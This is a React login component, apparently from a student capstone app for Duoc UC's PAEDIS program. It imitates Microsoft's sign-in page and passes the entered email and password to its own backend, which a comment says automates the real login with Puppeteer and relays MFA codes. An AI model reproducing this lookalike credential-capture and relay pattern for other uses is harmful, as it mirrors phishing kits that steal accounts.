import React, { useState } from 'react';
import { Eye, EyeOff, Loader2, AlertCircle, ArrowLeft } from 'lucide-react';
import { api } from '../../services/api';
import { useAccessibility } from '../../context/AccessibilityContext';

// Logo SVG de Microsoft (oficial)
const MicrosoftLogo = () => (
  <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <rect x="1" y="1" width="9" height="9" fill="#F25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7FBA00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00A4EF"/>
    <rect x="11" y="11" width="9" height="9" fill="#FFB900"/>
  </svg>
);

export const LoginForm = ({ onMfaRequired, onDirectSuccess }) => {
  const [step, setStep] = useState('email'); // 'email' | 'password'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const { announce } = useAccessibility();

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setErrorMessage('');

    if (!email) {
      const msg = 'Escribe tu correo, teléfono o Skype.';
      setErrorMessage(msg);
      announce(msg, 'assertive');
      return;
    }

    if (!email.includes('@')) {
      const msg = 'Ingresa una dirección de correo electrónico válida.';
      setErrorMessage(msg);
      announce(msg, 'assertive');
      return;
    }

    announce('Correo verificado. Ingresa tu contraseña.', 'polite');
    setStep('password');
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage('');

    if (!password) {
      const msg = 'Escribe tu contraseña.';
      setErrorMessage(msg);
      announce(msg, 'assertive');
      return;
    }

    setIsLoading(true);
    announce('Iniciando proceso de autenticación institucional en Duoc UC...', 'polite');

    try {
      const res = await api.login(email, password);

      if (!res.success) {
        setErrorMessage(res.message || 'Tu cuenta o contraseña son incorrectas. Inténtalo de nuevo.');
        announce(res.message || 'Error de autenticación', 'assertive');
        setIsLoading(false);
        return;
      }

      // El backend inicia Puppeteer en background y devuelve sessionId inmediatamente.
      // Cualquier respuesta exitosa con sessionId → ir a pantalla MFA para polling.
      if (res.sessionId) {
        onMfaRequired({
          sessionId: res.sessionId,
          mfaCode: res.mfaCode || null,
          email,
        });
      } else if (res.status === 'COMPLETED' && res.token) {
        // Flujo directo sin MFA (poco común)
        onDirectSuccess(res.token, res.user);
      } else {
        setErrorMessage('Respuesta inesperada del servidor. Intenta nuevamente.');
        setIsLoading(false);
      }
    } catch (err) {
      console.error('Error durante el login:', err);
      const msg = 'No se pudo conectar con el servicio. Por favor intente más tarde.';
      setErrorMessage(msg);
      announce(msg, 'assertive');
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-sm mx-auto">
      {/* Contenedor estilo MS Login */}
      <div className="bg-white border border-slate-300 rounded-sm shadow-lg p-8 sm:p-10">

        {/* Logo Microsoft */}
        <div className="mb-6">
          <MicrosoftLogo />
        </div>

        {step === 'email' ? (
          <>
            <h1 className="text-[1.5rem] font-semibold text-slate-900 mb-3 tracking-tight">
              Iniciar sesión
            </h1>

            {errorMessage && (
              <div
                role="alert"
                aria-live="assertive"
                className="mb-3 flex items-start gap-2 text-red-700 text-sm"
              >
                <AlertCircle className="w-4 h-4 mt-0.5 flex-shrink-0" aria-hidden="true" />
                <span>{errorMessage}</span>
              </div>
            )}

            <form onSubmit={handleEmailSubmit} noValidate>
              <div className="mb-4">
                <input
                  id="ms-email"
                  type="email"
                  required
                  autoComplete="email"
                  autoFocus
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Correo electrónico, teléfono o Skype"
                  aria-label="Correo, teléfono o Skype"
                  className="w-full px-3 py-2.5 border border-slate-400 text-slate-900 text-sm placeholder-slate-400 focus:outline-none focus:border-[#0067b8] focus:ring-1 focus:ring-[#0067b8] transition-colors"
                />
              </div>

              <p className="text-[0.8rem] text-slate-600 mb-6">
                ¿No tienes cuenta?{' '}
                <span className="text-[#0067b8] cursor-pointer hover:underline font-medium">
                  Crea una
                </span>
              </p>

              {/* Botón Siguiente estilo Microsoft */}
              <div className="flex justify-end">
                <button
                  type="submit"
                  className="px-6 py-2 bg-[#0067b8] hover:bg-[#005a9e] text-white font-semibold text-sm transition-colors focus:outline-none focus:ring-2 focus:ring-[#0067b8] focus:ring-offset-2"
                >
                  Siguiente
                </button>
              </div>
            </form>

            {/* Opciones de inicio alternativas */}
            <div className="mt-6 pt-5 border-t border-slate-200">
              <p className="text-[0.75rem] text-slate-500 mb-3">Opciones de inicio de sesión</p>
              <button
                type="button"
                className="flex items-center gap-2 text-[0.8rem] text-[#0067b8] hover:underline"
              >
                <span>🔑</span>
                <span>Iniciar sesión con Windows Hello o una llave de seguridad</span>
              </button>
            </div>
          </>
        ) : (
          <>
            {/* Paso 2: Contraseña */}
            <div className="mb-5">
              <button
                type="button"
                onClick={() => { setStep('email'); setErrorMessage(''); setPassword(''); }}
                className="flex items-center gap-1.5 text-[0.8rem] text-[#0067b8] hover:underline mb-4"
                aria-label="Volver a ingresar correo"
              >
                <ArrowLeft className="w-3.5 h-3.5" aria-hidden="true" />
                <span>{email}</span>
              </button>

              <h1 className="text-[1.5rem] font-semibold text-slate-900 tracking-tight">
                Escribir contraseña
              </h1>
            </div>

            {errorMessage && (
              <div
                role="alert"
                aria-live="assertive"
                className="mb-3 flex items-start gap-2 text-red-700 text-sm"
              >
                <AlertCircle className="w-4 h-4 mt-0.5 flex-shrink-0" aria-hidden="true" />
                <span>{errorMessage}</span>
              </div>
            )}

            <form onSubmit={handlePasswordSubmit} noValidate>
              <div className="mb-4 relative">
                <input
                  id="ms-password"
                  type={showPassword ? 'text' : 'password'}
                  required
                  autoComplete="current-password"
                  autoFocus
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Contraseña"
                  aria-label="Contraseña"
                  disabled={isLoading}
                  className="w-full px-3 py-2.5 pr-10 border border-slate-400 text-slate-900 text-sm placeholder-slate-400 focus:outline-none focus:border-[#0067b8] focus:ring-1 focus:ring-[#0067b8] transition-colors disabled:opacity-60"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
                  className="absolute inset-y-0 right-0 px-3 flex items-center text-slate-500 hover:text-slate-800"
                >
                  {showPassword ? (
                    <EyeOff className="w-4 h-4" aria-hidden="true" />
                  ) : (
                    <Eye className="w-4 h-4" aria-hidden="true" />
                  )}
                </button>
              </div>

              <p className="text-[0.8rem] mb-6">
                <span className="text-[#0067b8] cursor-pointer hover:underline font-medium">
                  ¿Olvidaste tu contraseña?
                </span>
              </p>

              <div className="flex justify-end">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="px-6 py-2 bg-[#0067b8] hover:bg-[#005a9e] text-white font-semibold text-sm transition-colors focus:outline-none focus:ring-2 focus:ring-[#0067b8] focus:ring-offset-2 disabled:opacity-60 disabled:cursor-wait flex items-center gap-2"
                >
                  {isLoading && <Loader2 className="w-4 h-4 animate-spin" aria-hidden="true" />}
                  {isLoading ? 'Iniciando sesión...' : 'Iniciar sesión'}
                </button>
              </div>
            </form>
          </>
        )}
      </div>

      {/* Badge Duoc UC institucional debajo del card */}
      <div className="mt-5 text-center">
        <span className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#002B49] text-amber-400 text-xs font-bold border border-amber-400/40 shadow">
          <span>🎓</span>
          <span>Cuenta institucional Duoc UC · PAEDIS 2026</span>
        </span>
      </div>

      {/* Acceso Demo para Capstone — solo en desarrollo */}
      {import.meta.env.DEV && (
        <div className="mt-4">
          <button
            type="button"
            onClick={() => {
              onDirectSuccess('demo-token-cristian', {
                nombre: 'Cristian Guzman Garcia',
                rut: '19.876.543-2',
                email: 'c.guzmang@duocuc.cl',
                carrera: 'Ingeniería en Informática',
                sede: 'Sede San Joaquín',
                paedis: {
                  isEnrolled: true,
                  tutorParAsignado: 'Tania Montes (Tutor PAR)',
                  diagnosticoDeclarado: 'Ajuste de Accesibilidad Sensorial / Motriz',
                },
              });
            }}
            className="w-full py-2 px-4 bg-amber-50 hover:bg-amber-100 text-amber-950 font-bold text-xs rounded border border-amber-300 transition-colors flex items-center justify-center gap-2"
          >
            <span>⚡</span>
            <span>Ingreso Rápido Demo (solo desarrollo)</span>
          </button>
        </div>
      )}
    </div>
  );
};
